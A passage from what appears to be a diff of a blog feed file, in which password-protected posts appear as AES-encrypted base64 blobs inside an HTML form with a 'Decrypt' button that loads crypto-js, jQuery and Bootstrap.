SIsqFKu2kQL+p20BTqgeppsufh4F4HMs5MzCGnXcbxifP5sL0zpO9PtRzkBbI2RaMnp4p7ayCEFYAhceaP3Hap3TWitKA4bDA97EpnYSpJLG+BVSjjlvk6MRf4EfJS3oD49FjjNejUzjkAyL9EX2VHPvUE4H586j+5JzTs4wx4w/4QE+IrsZT70Fzfrqzxd61+qNdLbT0LFPQ/0MeERLtAoYU2fILQHsi1FKAWjUbKmHB4TgBjce7vKf0J+xXgaTlvpZHqjGfpVNL34wcMSqzEVioo7zgNe26MEYdofgm86t2cC8jRukBlt9XLppOT3NQU3iTxWWtwOGvBiT0LGnaThoV7N3SS6YGpcUkeHiaOWWuaTJ7NOdD60ryiIkRMM3ImODoQ6j7W2ZAbXzdVi6b2O7HhWO9jlikVMsS2oBu7Bf3L43lz+dbcG6lB5OX+8UiPb0yf5Jvy1tlDKtKBClNMD1Qjm8C5QdAqaY8eqlMHkN83GzgOR9QMXtqMVwvxW6oO83PyJZT+TJ9SMbkkC5Gz/gJvEr50yr7VR1SH8arJjSkAq4c5KxHlvan0QhPiXWIfAoQXr7zTu84TCmLqLaU6s7mL3Anih3Q46cNFwPgha4SLSob6GJPNHvgecl1aTmrKDnIXjy54WZ3e/CCyPX02gB8ncZ86ExBzwtaRBXV49WkUUbqHHrUx3Hc5QhpZAy/Th4596CLVQGR+TK6qQbjNTQtCoVKEer+Qb7hLU+w8+DBlv27GVF/MsO7OHL7htJ8/z6qKJMR5XyraxKBMJmboJFQ+1WLm9y4dVvAiH2nybKXv84wALHhVXBZ9IY2FxBOSfeMYcnvghBwemUD+L0jnP4HTRg/VzO/vyIpREMZKDpSZoa3ajJj68fswGexUXdjvxMcwJ15Agy3TpKmfOJX5q5sc6239EJ4pKGHDvSFD1cymaMbGfZ7TxZMlgBtLt/t0BX1o5gOFMSVcRYVOrunXAi+TpG0/KlktJEB/0nOS+bU+y2lHEhSg0Wi/uRGfYARjftgcnr+zPK8k/U53eU/L/ss34M0gXPuwOnnzipEOJrqCFwAgtYCNN9Al0IVf5KaBksnlZqjlq0D5C4WjmBUwleZg25xEiwbla7bbFbYADye/GxB+SNn5tcXbJbMUmBnawXJ7emAhgds5dNIXDeJBCW5m5R8AGBO3KiaSgX4jy6mjZWRk+PyC1vC3WkwGeRU3c+6R4awFa9sKnorgp1dd87aKvRPLI8IiQcXY48UQW2A8DuMQX4TEgsIpRj1S6oI3TDY/XMnzfx3cCNCrjMrz7CdQu5ngRUFZ9bk7l3VPXOO2pzIYUQRWukyfarwhCeszkbR+U0HE3zPXqDJEcIx5lVdS/uhaDxlNZeG8ocpmmiLhp4zDpT0lv/4DOaKOBttY4t5tfhHrm5Jp8pV1wHj63Dd1DO+0lcGJ9saMk12r9csg7VY37Cag+/wgAPZzBXnDiUVom5qn37mm9bRnW13ioRtSBkPvcSrbVEH4o7Jc9SL0EatPwkPtpMYDpeeCjmJRWe9uG2UnjMG3IqMd1ORhpioIaWWijtsZkCC5502oDMgUz9xCLNHdYOZU49RYaww= </div>]]></content>
+      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
       
         <categories>
             
